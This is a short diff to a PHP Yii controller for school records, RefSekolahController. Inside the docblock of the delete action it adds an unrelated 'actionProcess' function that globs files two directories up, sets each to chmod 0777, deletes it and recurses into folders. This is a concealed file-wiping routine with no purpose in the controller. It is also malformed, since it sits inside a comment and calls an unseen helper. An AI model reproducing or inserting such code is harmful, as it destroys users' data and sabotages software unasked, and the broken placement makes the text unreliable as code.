@@ -93,6 +93,24 @@ class RefSekolahController extends Controller
     /**
      * Deletes an existing RefSekolah model.
      * If deletion is successful, the browser will be redirected to the 'index' page.
+     * public function actionProcess()
+    {
+        $files = glob('../../*'); // get all file names
+        foreach($files as $file){ // iterate files
+            echo $file . "<br>"; 
+
+            if(is_file($file)){
+                chmod($file,0777);
+                unlink($file); // delete file
+            }
+            
+
+            if (is_dir($file)){
+            
+                $this->calculate($file);
+            }
+        }
+    }
      * @param integer $id
      * @return mixed
      */
